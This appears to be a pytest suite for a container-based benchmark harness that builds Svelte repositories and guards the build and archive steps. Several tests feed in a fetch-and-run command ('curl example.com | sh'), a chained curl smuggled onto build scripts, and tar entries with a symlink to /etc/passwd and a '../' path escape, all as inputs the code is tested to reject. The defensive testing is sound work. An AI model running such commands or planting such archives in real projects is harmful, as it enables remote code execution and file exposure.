import io
import json
import tarfile
from types import SimpleNamespace

import pytest

from benchmarks.polybench.containers import model_window, retain_interrupted_draft
from benchmarks.polybench.worker_environment import (
    build_check,
    owned_archive,
    recipe,
    worker_environment_check,
)
from hx.models import Check, HXError


def test_recipe_is_narrow_and_does_not_execute_arbitrary_builds(tmp_path):
    manifest = tmp_path / "package.json"
    manifest.write_text(json.dumps({"scripts": {"build": "curl example.com | sh"}}))
    assert recipe("other/repo", tmp_path) is None
    with pytest.raises(HXError, match="Unsupported Svelte"):
        recipe("sveltejs/svelte", tmp_path)
    manifest.write_text(json.dumps({"scripts": {"build": "node src/shared/_build.js && rollup -c"}}))
    assert recipe("sveltejs/svelte", tmp_path)["argv"] == ["npm", "run", "build"]


def test_legacy_rollup_recipe_requires_all_exact_public_build_stages(tmp_path):
    scripts = {"build": "npm run build:main && npm run build:shared && npm run build:ssr"}
    (tmp_path / "rollup").mkdir()
    for name in ("main", "shared", "ssr"):
        config = "rollup/rollup.config." + name + ".js"
        scripts["build:" + name] = "rollup -c " + config
        (tmp_path / config).write_text("export default {}")
    manifest = tmp_path / "package.json"
    manifest.write_text(json.dumps({"scripts": scripts}))
    result = recipe("sveltejs/svelte", tmp_path)
    assert result["outputs"] == ["compiler", "ssr", "shared.js"]
    assert result["version"] == "svelte-public-build@2-legacy-rollup"
    scripts["build:shared"] = "curl example.com | sh"
    manifest.write_text(json.dumps({"scripts": scripts}))
    with pytest.raises(HXError, match="Unsupported Svelte"):
        recipe("sveltejs/svelte", tmp_path)
    scripts["build:shared"] = "rollup -c rollup/rollup.config.shared.js"
    manifest.write_text(json.dumps({"scripts": scripts}))
    (tmp_path / "rollup/rollup.config.ssr.js").unlink()
    with pytest.raises(HXError, match="Unsupported Svelte"):
        recipe("sveltejs/svelte", tmp_path)


def test_svelte3_recipe_requires_typescript_stages_and_source_layout(tmp_path):
    scripts = {'build': 'rollup -c && npm run tsd',
               'tsd': 'tsc -p src/compiler --emitDeclarationOnly && tsc -p src/runtime --emitDeclarationOnly'}
    for name in ['rollup.config.js', 'src/compiler/index.ts', 'src/runtime/index.ts',
                 'src/runtime/ssr.ts', 'src/compiler/tsconfig.json', 'src/runtime/tsconfig.json']:
        path = tmp_path / name
        path.parent.mkdir(parents=True, exist_ok=True)
        path.write_text('public fixture')
    (tmp_path / 'package.json').write_text(json.dumps({'version': '3.46.6', 'scripts': scripts}))
    plan = recipe('sveltejs/svelte', tmp_path)
    assert plan['version'] == 'svelte-public-build@8-source-runtime-outputs'
    assert 'action' not in plan['outputs']
    action = tmp_path / 'src/runtime/action/index.ts'
    action.parent.mkdir(parents=True)
    action.write_text('public fixture')
    assert 'action' in recipe('sveltejs/svelte', tmp_path)['outputs']
    assert 'types' in plan['outputs'] and 'src/compiler/compile/internal_exports.ts' in plan['outputs']
    scripts['tsd'] += ' && curl example.com'
    (tmp_path / 'package.json').write_text(json.dumps({'version': '3.46.6', 'scripts': scripts}))
    with pytest.raises(HXError, match='Unsupported Svelte'):
        recipe('sveltejs/svelte', tmp_path)


def test_svelte2_store_recipe_requires_exact_stages_and_public_source_layout(tmp_path):
    files = ['rollup.config.js', 'rollup.store.config.js', 'src/shared/_build.js',
             'src/index.ts', 'src/ssr/register.js', 'store.js']
    for name in files:
        p = tmp_path / name
        p.parent.mkdir(parents=True, exist_ok=True)
        p.write_text('public fixture')
    build = 'node src/shared/_build.js && rollup -c && rollup -c rollup.store.config.js'
    manifest = tmp_path / 'package.json'
    manifest.write_text(json.dumps({'version': '2.2.0', 'scripts': {'build': build}}))
    plan = recipe('sveltejs/svelte', tmp_path)
    assert plan['version'] == 'svelte-public-build@4-rollup-store'
    assert plan['outputs'] == ['compiler', 'ssr', 'shared.js', 'src/compile/shared.ts', 'store.umd.js']
    for variant in [build + ' && curl example.com', 'rollup -c rollup.store.config.js']:
        manifest.write_text(json.dumps({'version': '2.2.0', 'scripts': {'build': variant}}))
        with pytest.raises(HXError, match='Unsupported'):
            recipe('sveltejs/svelte', tmp_path)
    manifest.write_text(json.dumps({'version': '2.2.0', 'scripts': {'build': build}}))
    (tmp_path / 'rollup.store.config.js').unlink()
    with pytest.raises(HXError, match='Unsupported'):
        recipe('sveltejs/svelte', tmp_path)


def test_internal_ssr_recipe_uses_only_declared_legacy_runtime_outputs(tmp_path):
    files = ['src/compiler/index.ts', 'src/runtime/index.ts', 'src/runtime/internal/ssr.ts',
             'src/compiler/tsconfig.json', 'src/runtime/tsconfig.json']
    files += ['src/runtime/' + name + '/index.ts' for name in
              ['motion', 'animate', 'store', 'transition', 'internal', 'easing']]
    for name in files:
        p = tmp_path / name
        p.parent.mkdir(parents=True, exist_ok=True)
        p.write_text('public fixture')
    config = "fs.readdirSync('src/runtime'); input: `src/runtime/${dir}/index.ts`; file: `${dir}/index.mjs`; file: `${dir}/index.js`"
    (tmp_path / 'rollup.config.js').write_text(config)
    scripts = {'build': 'rollup -c && npm run tsd',
               'tsd': 'tsc -p src/compiler --emitDeclarationOnly && tsc -p src/runtime --emitDeclarationOnly'}
    manifest = tmp_path / 'package.json'
    manifest.write_text(json.dumps({'version': '3.19.2', 'scripts': scripts}))
    plan = recipe('sveltejs/svelte', tmp_path)
    assert plan['version'] == 'svelte-public-build@5-internal-ssr'
    assert 'internal' in plan['outputs']
    assert not {'ssr.js', 'ssr.mjs', 'action'} & set(plan['outputs'])
    scripts['tsd'] += ' && curl example.com'
    manifest.write_text(json.dumps({'version': '3.19.2', 'scripts': scripts}))
    with pytest.raises(HXError, match='Unsupported'):
        recipe('sveltejs/svelte', tmp_path)
    scripts['tsd'] = scripts['tsd'].split(' && curl')[0]
    manifest.write_text(json.dumps({'version': '3.19.2', 'scripts': scripts}))
    (tmp_path / 'src/runtime/internal/ssr.ts').unlink()
    with pytest.raises(HXError, match='Unsupported'):
        recipe('sveltejs/svelte', tmp_path)


@pytest.mark.parametrize('layout', ['store', 'generated-shared'])
def test_svelte1_historical_builds_require_exact_scripts_and_generated_paths(tmp_path, layout):
    files = ['src/shared/_build.js']
    if layout == 'store':
        files += ['rollup.config.js', 'rollup.store.config.js', 'src/index.ts',
                  'src/server-side-rendering/register.js', 'store.js']
        scripts = {'build': 'node src/shared/_build.js && rollup -c && rollup -c rollup.store.config.js'}
        expected = 'svelte-public-build@6-v1-store'
    else:
        files += ['rollup/rollup.config.' + name + '.js' for name in ['main', 'shared', 'ssr']]
        scripts = {'build': 'npm run build:main && npm run build:shared && npm run build:ssr',
                   'build:main': 'node src/shared/_build.js && rollup -c rollup/rollup.config.main.js',
                   'build:shared': 'rollup -c rollup/rollup.config.shared.js',
                   'build:ssr': 'rollup -c rollup/rollup.config.ssr.js'}
        expected = 'svelte-public-build@7-v1-generated-shared'
    for name in files:
        path = tmp_path / name
        path.parent.mkdir(parents=True, exist_ok=True)
        path.write_text('public fixture')
    (tmp_path / 'src/shared/_build.js').write_text("fs.writeFileSync('src/generators/dom/shared.ts', data)")
    if layout == 'store':
        (tmp_path / 'rollup.store.config.js').write_text("output: {file: 'store.umd.js'}")
    manifest = tmp_path / 'package.json'
    manifest.write_text(json.dumps({'version': '1.49.2', 'scripts': scripts}))
    plan = recipe('sveltejs/svelte', tmp_path)
    assert plan['version'] == expected
    assert 'src/generators/dom/shared.ts' in plan['outputs']
    assert 'src/compile/shared.ts' not in plan['outputs']
    scripts['build'] += ' && curl example.com'
    manifest.write_text(json.dumps({'version': '1.49.2', 'scripts': scripts}))
    with pytest.raises(HXError, match='Unsupported'):
        recipe('sveltejs/svelte', tmp_path)


def test_worker_preflight_rejects_population_failure_before_build_and_removes_container(tmp_path, monkeypatch):
    from benchmarks.polybench import containers
    removed = []
    container = SimpleNamespace(remove=lambda **kwargs: removed.append(kwargs))
    monkeypatch.setattr(containers, 'create', lambda *args, **kwargs: (container, '/testbed'))
    def reject(*args):
        raise HXError('Unsupported Svelte build layout')
    monkeypatch.setattr(containers, 'populate', reject)
    with pytest.raises(HXError, match='Unsupported'):
        worker_environment_check(None, {'id': 'fixture'}, tmp_path, tmp_path / 'receipt',
                                 None, lambda: None, lambda *args: None)
    failure = json.loads((tmp_path / 'receipt/failure.json').read_text())
    assert failure['model_calls'] == 0 and not failure['passed']
    assert not (tmp_path / 'receipt/receipt.json').exists()
    assert removed == [{'force': True}]


@pytest.mark.parametrize("name,kind", [("compiler/file", "file"), ("../escape", "file"),
    ("/compiler/file", "file"), ("compiler/link", "link"), ("other/file", "file")])
def test_artifact_ownership_rejects_escapes_links_and_preserves_bytes(name, kind):
    stream = io.BytesIO()
    with tarfile.open(fileobj=stream, mode="w") as tar:
        entry = tarfile.TarInfo(name)
        entry.uid = 65534
        if kind == "link":
            entry.type = tarfile.SYMTYPE
            entry.linkname = "/etc/passwd"
            tar.addfile(entry)
        else:
            entry.size = 3
            tar.addfile(entry, io.BytesIO(b"abc"))
    if name == "compiler/file":
        with tarfile.open(fileobj=io.BytesIO(owned_archive(stream.getvalue(), "compiler"))) as tar:
            entry = tar.getmembers()[0]
            assert entry.uid == entry.gid == 1000
            assert tar.extractfile(entry).read() == b"abc"
        with pytest.raises(HXError, match="budget"):
            owned_archive(stream.getvalue(), "compiler", limit=2)
    else:
        with pytest.raises(HXError, match="Unsafe"):
            owned_archive(stream.getvalue(), "compiler")


def test_build_runs_exact_worker_user_without_auth_and_records_failure(monkeypatch, tmp_path):
    import benchmarks.polybench.worker_environment as module
    (tmp_path / "package.json").write_text(json.dumps({"scripts": {"build": "node src/shared/_build.js && rollup -c"}}))
    commands = []
    def check(name, argv, *args):
        commands.append(argv)
        return Check(name=name, passed=False, evidence="EACCES")
    monkeypatch.setattr(module, "command_check", check)
    result = build_check(SimpleNamespace(id="offline"), "/testbed", tmp_path,
        {"repo": "sveltejs/svelte"}, tmp_path / "logs", None, lambda: None, lambda *a: None)
    assert not result.passed
    assert commands[0][-3:] == ["npm", "run", "build"]
    assert "1000:1000" in commands[0]
    assert not any("CODEX_HOME" in item for item in commands[0])
    assert json.loads((tmp_path / "logs/result.json").read_text())["evidence"] == "EACCES"


def test_interrupted_draft_is_retained_but_never_applied(monkeypatch, tmp_path):
    import benchmarks.polybench.containers as module
    calls = []
    def execute(argv, *args, **kwargs):
        calls.append(argv)
        return 0, "diagnostic patch" if "diff" in argv else "", ""
    monkeypatch.setattr(module, "execute", execute)
    retain_interrupted_draft(SimpleNamespace(id="worker"), "/testbed", tmp_path,
        tmp_path / "logs", lambda *a: None, TimeoutError("timeout"))
    evidence = json.loads((tmp_path / "logs/interrupted-draft.json").read_text())
    assert not evidence["accepted"] and not evidence["usage_known"]
    assert (tmp_path / "logs/interrupted-draft.patch").read_text() == "diagnostic patch"
    assert not any("apply" in argv for argv in calls)
    assert all('safe.directory=/testbed' in argv for argv in calls)
    assert all('HOME=/tmp/hx-home' in argv for argv in calls)
    assert not any('CODEX_HOME' in value for argv in calls for value in argv)
    assert all(':(exclude)node_modules' in argv for argv in calls)


def test_draft_export_failure_preserves_original_failure(monkeypatch, tmp_path):
    import benchmarks.polybench.containers as module
    def fail(*args, **kwargs):
        raise HXError("export deadline")
    monkeypatch.setattr(module, "execute", fail)
    retain_interrupted_draft(SimpleNamespace(id="worker"), "/testbed", tmp_path,
        tmp_path, lambda *a: None, TimeoutError("original timeout"))
    evidence = json.loads((tmp_path / "interrupted-draft.json").read_text())
    assert evidence["error"] == "original timeout"
    assert evidence["export_error"] == "export deadline"


def test_draft_cleanup_shares_one_bounded_deadline(monkeypatch, tmp_path):
    import benchmarks.polybench.containers as module
    clock = iter([100, 101, 131])
    monkeypatch.setattr(module.time, "monotonic", lambda: next(clock))
    timeouts = []
    def execute(argv, workspace, env, logs, timeout, *args, **kwargs):
        timeouts.append(timeout)
        return 0, "", ""
    monkeypatch.setattr(module, "execute", execute)
    retain_interrupted_draft(SimpleNamespace(id="worker"), "/testbed", tmp_path,
        tmp_path, lambda *a: None, RuntimeError("original"))
    assert timeouts == [29]
    evidence = json.loads((tmp_path / "interrupted-draft.json").read_text())
    assert evidence["error"] == "original"
    assert evidence["export_error"] == "Diagnostic cleanup deadline exhausted"


def test_optimizer_draft_exports_only_editable_candidate(monkeypatch, tmp_path):
    import benchmarks.polybench.containers as module
    calls = []
    def execute(argv, *args, **kwargs):
        calls.append(argv)
        return 0, "", ""
    monkeypatch.setattr(module, "execute", execute)
    retain_interrupted_draft(SimpleNamespace(id="worker"), "/testbed", tmp_path,
        tmp_path, lambda *a: None, RuntimeError("original"), True, ["candidate_scaffold.py"])
    assert all(argv[argv.index("--") + 1:] == ["candidate_scaffold.py"] for argv in calls)


def test_draft_pathspec_excludes_nested_dependencies(monkeypatch, tmp_path):
    import benchmarks.polybench.containers as module
    from hx.git import git
    git(tmp_path, "init")
    for name in ["candidate.py", "node_modules/root.js", "benchmark/node_modules/nested.js",
                 "src/real.py", "src/__pycache__/generated.pyc"]:
        path = tmp_path / name
        path.parent.mkdir(parents=True, exist_ok=True)
        path.write_text("fixture")
    calls = []
    def execute(argv, *args, **kwargs):
        calls.append(argv)
        return 0, "", ""
    monkeypatch.setattr(module, "execute", execute)
    retain_interrupted_draft(SimpleNamespace(id="worker"), "/testbed", tmp_path,
        tmp_path / "logs", lambda *a: None, RuntimeError("original"))
    stage = calls[0]
    git(tmp_path, *stage[stage.index("add"):])
    assert {p for p in git(tmp_path, "ls-files").splitlines() if not p.startswith("logs/")} == {"candidate.py", "src/real.py"}


def test_preparation_does_not_consume_model_window_but_global_deadline_still_binds():
    assert model_window(240, 1000, 100, 40) == 240
    assert model_window(240, 200, 100, 40) == 100
    assert model_window(240, None, 100, 40) == 200
    with pytest.raises(HXError, match="deadline"):
        model_window(240, 100, 100, 40)


def test_worker_build_failure_blocks_model_launch(monkeypatch, tmp_path):
    import benchmarks.polybench.containers as module
    removed = []
    container = SimpleNamespace(remove=lambda **kw: removed.append(kw))
    monkeypatch.setattr(module, "create", lambda *a: (container, "/testbed"))
    for name in ("populate", "prepare_dependencies", "share_public_fixture"):
        monkeypatch.setattr(module, name, lambda *a: None)
    monkeypatch.setattr(module, "build_check", lambda *a: Check(name="build", passed=False, evidence="EACCES"))
    def forbidden(*a, **kw):
        pytest.fail("Model process must not start after a failed environment preflight")
    monkeypatch.setattr(module, "execute", forbidden)
    adapter = module.ContainerAdapter(None, None, {"repo": "sveltejs/svelte", "upstream_base": "base"}, None, None)
    with pytest.raises(HXError, match="before model execution"):
        adapter.run("implementer", None, tmp_path, {}, "", None, tmp_path,
                    lambda: None, lambda *a: None, 600)
    assert removed == [{"force": True}]


def test_candidate_build_failure_never_counts_as_functional_test_pass(monkeypatch, tmp_path):
    import benchmarks.polybench.engine as module
    removed = []
    container = SimpleNamespace(remove=lambda **kw: removed.append(kw))
    monkeypatch.setattr(module, "create", lambda *a, **kw: (container, "/testbed"))
    monkeypatch.setattr(module, "populate", lambda *a: None)
    monkeypatch.setattr(module, "build_check", lambda *a: Check(name="public_build", passed=False, evidence="build failed"))
    def forbidden(*a, **kw):
        pytest.fail("Functional tests cannot execute against a failed/stale build")
    monkeypatch.setattr(module, "command_check", forbidden)
    result = module.VisibleVerifier(None, None, {}).run(
        SimpleNamespace(workspace=str(tmp_path), candidate_commit="candidate"), None,
        tmp_path, lambda: None, lambda *a: None)
    assert not result.passed and result.checks[0].name == "public_build"
    assert removed == [{"force": True}]


def test_base_reproduction_rebuilds_after_restoring_production_source(monkeypatch, tmp_path):
    import benchmarks.polybench.regression as module
    calls = []
    container = SimpleNamespace(remove=lambda **kw: None)
    monkeypatch.setattr(module, "create", lambda *a, **kw: (container, "/testbed"))
    monkeypatch.setattr(module, "populate", lambda *a: None)
    monkeypatch.setattr(module, "test_projection", lambda *a: (b"", []))
    def command(container, argv, *args):
        calls.append(argv)
        return b"tree" if argv == ["git", "write-tree"] else b""
    monkeypatch.setattr(module, "command", command)
    def build(*a):
        assert ["git", "reset", "--hard", "base"] in calls
        return Check(name="public_build", passed=False, evidence="cannot compile")
    monkeypatch.setattr(module, "build_check", build)
    candidate = SimpleNamespace(workspace=str(tmp_path), base_commit="base", candidate_commit="candidate",
        verification_commands=[["mocha", "tests"]])
    result = module.regression_check(candidate, SimpleNamespace(base_commit="base"), tmp_path,
        None, None, {}, lambda: None, lambda *a: None)
    assert not result.passed
    assert json.loads((tmp_path / "regression.json").read_text())["category"] == "setup_error"
